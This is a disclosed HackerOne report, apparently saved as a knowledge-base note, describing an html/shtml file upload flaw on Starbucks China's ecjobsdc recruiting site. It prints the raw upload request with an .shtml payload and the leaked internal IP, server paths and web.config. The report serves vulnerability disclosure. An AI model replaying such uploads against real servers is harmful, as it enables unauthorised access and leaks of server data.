---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/web
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2020-01-29
submitted: 2018-09-21T15:35:05.980Z
bounty_usd: null
votes: 46
cve: []
program: "[[programs/starbucks|Starbucks]]"
reporter: "b006e4ea768a5d1b5340969"
source: "https://hackerone.com/reports/412481"
title: "China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability"
---
# China - ecjobsdc.starbucks.com.cn html/shtml file upload vulnerability

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 46 | **Program:** Starbucks | **Disclosed:** 2020-01-29

- Report: [https://hackerone.com/reports/412481](https://hackerone.com/reports/412481)
- CWE: Privilege Escalation
- Submitted: 2018-09-21T15:35:05.980Z

## Report summary

neweq discovered that ecjobsdc.starbucks.com.cn had a file upload vulnerability that permitted an attacker to upload html and shtml files which could then be accessed in a browser.

@neweq — thank you for reporting this vulnerability.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### 1, Summary
During the test, I found ecjobsdc.starbucks.com.cn this site has an upload vulnerability, you can upload html and shtml format files, so you can read the server's intranet IP, the physical address of the website application and read the website web.config file.
###2, Vulnerability scope
https://ecjobsdc.starbucks.com.cn
###3, proof of exploit

By modifying the suffix of filename, this address can be uploaded to upload html and shtml files, so that you can read the server's intranet IP, the physical address of the website application, and the configuration file of the website.
Vulnerability certificate

```
POST /recruitjob/hxpublic_v6/hxinterface6.aspx?_hxcategory=hx_filebox_upload_file HTTP/1.1
Host: ecjobsdc.starbucks.com.cn
Connection: close
Content-Length: 234
Cache-Control: max-age=0
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryevPInYidBxSvSd06
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryevPInYidBxSvSd06
Content-Disposition: form-data; name="hxwebfileboxcontrol_upload_file_inputbox"; filename="xxx.shtml"
Content-Type: text/html

<?php echo 1111;>
------WebKitFormBoundaryevPInYidBxSvSd06--
```

Successfully read the website's remoteaddr webpathinfo web.config file.

```
DOCUMENT_NAMED:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
SERVER_SOFTWARE :Microsoft-IIS/8.5
SERVER_NAME :ecjobsdc.starbucks.com.cn
SERVER_PORT :80
REMOTE_ADDR:10.92.29.50
REMOTE_HOST:10.92.29.50
D:\TrustHX\STBKSERM101\www_app\tempfiles\temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
PATH_INFO:/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
/recruitjob/tempfiles/temp_uploaded_34afb246-02f1-4cb0-978d-15805c2a05c8.shtml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <httpRedirect enabled="false" destination="https://ecjobs.starbucks.net" exactDestination="false" />
    </system.webServer>
</configuration>
```
{F349302}
{F349303}

## Impact

Phishing attack, remote file reading

## Timeline

- **Report Filed**
- **2018-09-23** @dukefleed: Hello @neweq,

Thank you for the report. We are currently reviewing this and will get in touch with you once our review is complete.

Kind regards,
@dukefleed
- **Report Severity Updated**
- **Report Triaged**
- **Not Eligible For Bounty**
- **2018-09-25** @b006e4ea768a5d1b5340969: @ristretto Thank you:)
- **Report Resolved**
- **Agreed On Going Public**
- **Report Title Updated**
- **Agreed On Going Public**
- **Report Became Public**
